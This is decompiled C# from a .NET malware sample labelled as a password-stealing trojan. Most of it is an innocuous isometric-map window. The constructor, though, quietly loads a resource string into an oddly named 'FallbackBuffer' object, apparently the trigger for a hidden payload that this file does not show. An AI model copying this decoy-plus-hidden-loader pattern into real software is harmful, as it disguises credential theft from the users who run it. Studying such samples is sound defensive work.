// Decompiled with JetBrains decompiler
// Type: StaggeringIsometricMap.Main
// Assembly: MethodRental, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: AE514D88-1D27-426C-B393-9775A20FC38F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-PSW.MSIL.Heye.gen-3ce20a7d233efc8e8970d6d9d7eeb810bae52c5f42d252a935c32299fe708041.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using StaggeringIsometricMap.My.Resources;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace StaggeringIsometricMap
{
  [DesignerGenerated]
  public class Main : Form
  {
    private bool Drag;
    private int Xaxys;
    private int Yaxys;
    private IContainer components;
    internal string Textbox0;
    internal FallbackBuffer Timer0;

    public Main()
    {
      this.Load += new EventHandler(this.Main_Load);
      this.Textbox0 = Marshaler.Opera;
      this.Timer0 = new FallbackBuffer((ushort) 2, true, false, this.Textbox0, 66.565656, 1.0);
      this.InitializeComponent();
    }

    private void Main_Load(object sender, EventArgs e)
    {
      this.draw_map();
      this.enableDragControl();
      this.enableDragForm();
    }

    private void enableDragForm()
    {
      this.MouseUp += (MouseEventHandler) ((e_sender, eventargs) => this.disableDrag());
      this.MouseDown += (MouseEventHandler) ((e_sender, eventargs) => this.enableDrag());
      this.MouseMove += (MouseEventHandler) ((e_sender, eventargs) => this.moveControl());
    }

    private void enableDragControl()
    {
      try
      {
        foreach (Control control1 in this.Controls)
        {
          control1.MouseUp += (MouseEventHandler) ((e_sender, eventargs) => this.disableDrag());
          control1.MouseDown += (MouseEventHandler) ((e_sender, eventargs) => this.enableDrag());
          control1.MouseMove += (MouseEventHandler) ((e_sender, eventargs) => this.moveControl());
          if (control1 is Panel)
          {
            try
            {
              foreach (Control control2 in control1.Controls)
              {
                control2.MouseUp += (MouseEventHandler) ((e_sender, eventargs) => this.disableDrag());
                control2.MouseDown += (MouseEventHandler) ((e_sender, eventargs) => this.enableDrag());
                control2.MouseMove += (MouseEventHandler) ((e_sender, eventargs) => this.moveControl());
              }
            }
            finally
            {
              IEnumerator enumerator;
              if (enumerator is IDisposable)
                (enumerator as IDisposable).Dispose();
            }
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
    }

    public void draw_map()
    {
      this.IsometricGrid.CreateGraphics();
      int num1 = 15;
      int num2 = 17;
      double num3 = 40.0;
      double num4 = Math.Ceiling(num3 / 2.0);
      int int32_1 = Convert.ToInt32(((double) this.Width - ((double) num1 + 0.5) * num3) / 2.0);
      int int32_2 = Convert.ToInt32(((double) this.Height - ((double) num2 + 0.5) * num4) / 2.0);
      double num5 = num4 / 2.0;
      double num6 = num3 / 2.0;
      int count = 0;
      int num7 = checked (2 * num2 - 1);
      int num8 = 0;
      while (num8 <= num7)
      {
        if (num8 % 2 == 0)
        {
          int num9 = checked (num1 - 1);
          int num10 = 0;
          while (num10 <= num9)
          {
            this.renderCell(new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num10 * num3))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num10 * num3 + num6))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num10 * num3 + num3))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num10 * num3 + num6))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num4)))), count, Color.DimGray);
            checked { ++count; }
            checked { ++num10; }
          }
        }
        else
        {
          int num11 = checked (num1 - 2);
          int num12 = 0;
          while (num12 <= num11)
          {
            this.renderCell(new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num12 * num3 + num6))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num12 * num3 + num3))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num12 * num3 + num3 + num6))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num5)))), new Point(checked ((int) Math.Round(unchecked ((double) int32_1 + (double) num12 * num3 + num3))), checked ((int) Math.Round(unchecked ((double) int32_2 + (double) num8 * num5 + num4)))), count, Color.DarkGray);
            checked { ++count; }
            checked { ++num12; }
          }
        }
        checked { ++num8; }
      }
    }

    private void renderCell(
      Point left,
      Point top,
      Point right,
      Point down,
      int count,
      Color color)
    {
      DiamondPictureBox diamondPictureBox = new DiamondPictureBox();
      diamondPictureBox.BackColor = color;
      diamondPictureBox.Size = new Size(36, 18);
      diamondPictureBox.Location = left;
      diamondPictureBox.Name = Conversions.ToString(count);
      DiamondPictureBox diamondPictureBox1 = diamondPictureBox;
      EventHandler eventHandler;
      // ISSUE: reference to a compiler-generated field
      if (Main._Closure\u0024__.\u0024I8\u002D0 != null)
      {
        // ISSUE: reference to a compiler-generated field
        eventHandler = Main._Closure\u0024__.\u0024I8\u002D0;
      }
      else
      {
        int num;
        // ISSUE: reference to a compiler-generated field
        Main._Closure\u0024__.\u0024I8\u002D0 = eventHandler = (EventHandler) ((e_sender, eventargs) => num = (int) Interaction.MsgBox(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(e_sender, (System.Type) null, "Name", new object[0], (string[]) null, (System.Type[]) null, (bool[]) null))));
      }
      diamondPictureBox1.Click += eventHandler;
      diamondPictureBox.MouseMove += (MouseEventHandler) ((e_sender, eventargs) => diamondPictureBox.BackColor = Color.Teal);
      diamondPictureBox.MouseLeave += (EventHandler) ((e_sender, eventargs) => diamondPictureBox.BackColor = Color.DarkGray);
      this.IsometricGrid.Controls.Add((Control) diamondPictureBox);
    }

    private void disableDrag() => this.Drag = false;

    private void enableDrag()
    {
      this.Drag = true;
      this.Xaxys = checked (Cursor.Position.X - this.Left);
      this.Yaxys = checked (Cursor.Position.Y - this.Top);
    }

    private void moveControl()
    {
      if (!this.Drag)
        return;
      Point position = Cursor.Position;
      this.Top = checked (position.Y - this.Yaxys);
      position = Cursor.Position;
      this.Left = checked (position.X - this.Xaxys);
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof (Main));
      this.IsometricGrid = new Panel();
      this.SuspendLayout();
      this.IsometricGrid.Location = new Point(13, 14);
      this.IsometricGrid.Margin = new Padding(4, 5, 4, 5);
      this.IsometricGrid.Name = "IsometricGrid";
      this.IsometricGrid.Size = new Size(669, 481);
      this.IsometricGrid.TabIndex = 2;
      this.AutoScaleDimensions = new SizeF(8f, 20f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.Black;
      this.ClientSize = new Size(696, 509);
      this.Controls.Add((Control) this.IsometricGrid);
      this.Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.ForeColor = Color.White;
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.Margin = new Padding(4, 5, 4, 5);
      this.Name = nameof (Main);
      this.Opacity = 0.85;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "StaggeringIsometricMap Visual basic";
      this.ResumeLayout(false);
    }

    [field: AccessedThroughProperty("IsometricGrid")]
    internal virtual Panel IsometricGrid { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }
  }
}
